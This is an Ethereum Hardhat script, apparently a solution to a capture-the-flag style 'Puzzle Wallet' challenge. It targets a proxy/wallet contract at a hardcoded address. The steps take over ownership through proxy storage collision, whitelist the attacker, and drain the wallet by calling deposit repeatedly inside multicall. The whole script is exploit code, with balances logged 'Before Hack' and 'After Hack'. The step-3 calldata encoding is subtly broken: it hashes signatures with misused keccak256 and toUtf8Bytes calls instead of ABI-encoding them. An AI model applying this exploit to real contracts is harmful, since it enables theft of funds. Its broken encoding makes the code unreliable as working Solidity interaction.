// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {

  const [player] = await hre.ethers.getSigners();
  // Use the ABI form both the proxy contract and wallet contract pointed at the wallet address
  const contractAddress = '0xbDf6D8D134505A81ab0a95eb7275a097E69f21E1';
  const proxy = await hre.ethers.getContractAt("PuzzleProxy", contractAddress);
  const wallet = await hre.ethers.getContractAt("PuzzleWallet", contractAddress);

  // Step 1: Become a pendingAdmin on the proxy contract which will by proxy make us the owner of the wallet contract
  // const tx1 = await proxy.connect(player).proposeNewAdmin(player.address);
  // const receipt1 = await tx1.wait()
  // console.log(`Proxy Pending Admin: ${await proxy.connect(player).pendingAdmin()}`);
  // console.log(`Wallet Owner: ${await wallet.connect(player).owner()}`);

  // // Step 2: Add myself to the whitelist
  // const tx2 = await wallet.connect(player).addToWhitelist(player.address);
  // const receipt2 = await tx2.wait()
  // console.log(`Player added to whitelist: ${await wallet.connect(player).whitelisted(player.address)}`); // will return true if completed successfully

  // Step 3: Draining the wallet so that we can call the setMaxBalance variable to set ourselves as the admin 
  // I had to look this up....
  // We need to set up 3 separate function signatures:
    // 1: We need to invoke the PuzzleWallet deposit function
    // 2: We need to call the multicall function (which will call deposit again)
    // 3: Call execute to ourselves --> Because we've effectively called deposit twice in the previous two functions, we'll actually get 2x our ETH
  console.log(`Contract Balance Before Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);
  const func1 = hre.ethers.utils.keccak256(
    hre.ethers.utils.toUtf8Bytes('deposit()')
  );
  const func2 = hre.ethers.utils.keccak256(
    hre.ethers.utils.toUtf8Bytes('multicall(bytes[])'),
    hre.ethers.utils.toUtf8Bytes('deposit()')
  );
  const func3 = hre.ethers.utils.keccak256(
    hre.ethers.utils.toUtf8Bytes('execute(address,uint256,bytes)'),
    hre.ethers.utils.toUtf8Bytes(player.address),
    hre.ethers.utils.toUtf8Bytes(hre.ethers.utils.parseEther("0.0001")),
    hre.ethers.utils.toUtf8Bytes([])
  );
  const funcArray = [func1, func2, func3];
  console.log(funcArray);
  const tx3 = await wallet.connect(player).multicall(funcArray, { from: player.address, value: hre.ethers.utils.parseEther("0.00005") });
  const receipt3 = await tx3.wait();
  console.log(`Contract Balance After Hack: ${await hre.ethers.provider.getBalance(wallet.address)}`);

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
// main()
